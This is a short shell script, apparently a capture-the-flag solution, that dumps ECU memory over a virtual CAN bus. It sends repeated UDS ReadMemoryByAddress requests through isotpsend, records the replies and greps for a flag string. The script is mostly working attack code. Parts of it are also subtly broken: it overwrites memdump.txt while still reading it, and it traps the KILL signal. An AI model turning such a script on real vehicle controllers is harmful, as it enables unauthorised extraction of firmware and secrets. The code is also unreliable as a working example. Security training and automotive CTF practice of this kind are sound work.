#!/usr/bin/env sh

START_ADDR=C3F80000
SIZE_SIZE=4
PAGE_SIZE=3000
NPAGES=10
cleanup() {

if kill -0 $tester 2>/dev/null; then
   kill "$tester" 
fi

if kill -0 $monitor 2>/dev/null; then
   kill "$monitor" 
fi

exit 0 
}

trap 'cleanup' EXIT INT TERM KILL HUP 

send_mem_req() {
for addr in $(seq $((16#$START_ADDR)) $PAGE_SIZE $((16#$START_ADDR + ($NPAGES*$PAGE_SIZE))))
do
   addr=$(printf "%08X" "$addr" | sed 's/../& /g')
   size=$(printf "%04X" "$PAGE_SIZE" | sed 's/../& /g')

   echo "23 24 $(printf "%s%s" "$addr" "$size")" | isotpsend -s 7E0 -d 7E8 -g 1000000 vcan0 
done
}


send_mem_req & tester=$!
isotprecv -s 7E0 -d 7E8 -l vcan0  > ./memdump.txt & monitor=$!

wait $tester 
sleep 2 
kill "$monitor"

cat memdump.txt | cut -d ' ' -f 2- | tr -d '\n' | fold -w 96 - > memdump.txt 
printf "\n" >> memdump.txt
cat memdump.txt | xxd -r -p -c 32 >> memdump.txt
printf "\n" >> memdump.txt

grep -E 'flag\{.*\}' ./memdump.txt

